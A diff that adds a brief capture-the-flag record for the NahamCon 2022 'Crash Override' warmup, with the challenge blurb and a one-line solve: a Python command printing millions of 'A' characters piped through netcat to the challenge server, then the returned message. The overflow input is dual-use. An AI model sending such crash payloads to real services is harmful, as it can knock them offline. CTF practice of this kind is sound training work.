@@ -1,0 +1,18 @@
+Crash Override
+50 points - Warmups - 915 Solves - easy
+Author: @M_alpha#3534
+
+Remember, hacking is more than just a crime. It's a survival trait.
+
+PS (not challenge related), thank you so much to HackTheBox for supporting NahamCon 2022!
+
+
+
+Press the Start button on the top-right to begin this challenge.
+Attachments: 
+linux@ubuntu:~/results/keepers$ python3 -c "print('A'*205111111)" | nc challenge.nahamcon.com 30065
+HACK THE PLANET!!!!!!
+
+
+
+
